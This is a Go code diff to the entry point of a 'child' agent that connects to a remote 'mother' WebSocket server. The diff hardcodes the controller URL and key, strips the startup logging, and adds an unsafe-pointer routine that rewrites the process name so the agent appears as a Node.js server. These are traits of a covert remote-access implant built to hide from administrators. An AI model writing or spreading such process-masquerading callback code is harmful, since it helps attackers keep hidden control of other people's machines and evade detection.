@@ -2,38 +2,42 @@ package main
 
 import (
 	"context"
-	"flag"
-	"fmt"
 	"log"
 	"os"
 	"os/signal"
+	"reflect"
+	"unsafe"
 
 	"github.com/huanxherta/hx-snack/internal/child"
 )
 
-var Version = "dev"
+// ====== 硬编码配置（编译时修改这里） ======
+const (
+	motherURL = "ws://<YOUR_HOST>:10300/api/stream"
+	motherKey = "<YOUR_KEY>"
+)
+// ========================================
+
+func xxxxxxxxProcess() {
+	name := "/usr/bin/node /app/server.js"
+	hdr := (*reflect.StringHeader)(unsafe.Pointer(&os.Args[0]))
+	buf := (*[1 << 20]byte)(unsafe.Pointer(hdr.Data))[:hdr.Len]
+	copy(buf, name)
+	for i := len(name); i < len(buf); i++ {
+		buf[i] = 0
+	}
+	hdr.Len = len(name)
+}
 
 func main() {
-	var (
-		motherURL = flag.String("mother", "", "Mother WebSocket URL (e.g., wss://host/ws)")
-		psk       = flag.String("key", "", "Pre-shared key for auth")
-	)
-	flag.Parse()
+	xxxxxxxxProcess()
 
-	if *motherURL == "" {
-		fmt.Println("Usage: child -mother wss://host/ws [-key xxx]")
-		os.Exit(1)
-	}
-
-	agent := child.NewAgent(*motherURL, *psk, Version)
+	agent := child.NewAgent(motherURL, motherKey, "dev")
 
 	ctx, cancel := signal.NotifyContext(context.Background(), os.Interrupt)
 	defer cancel()
 
-	log.Printf("[child] hxの偷吃 Child v%s starting...", Version)
-	log.Printf("[child] connecting to mother: %s", *motherURL)
-
 	if err := agent.Run(ctx); err != nil {
-		log.Printf("[child] stopped: %v", err)
+		log.Printf("exit: %v", err)
 	}
 }
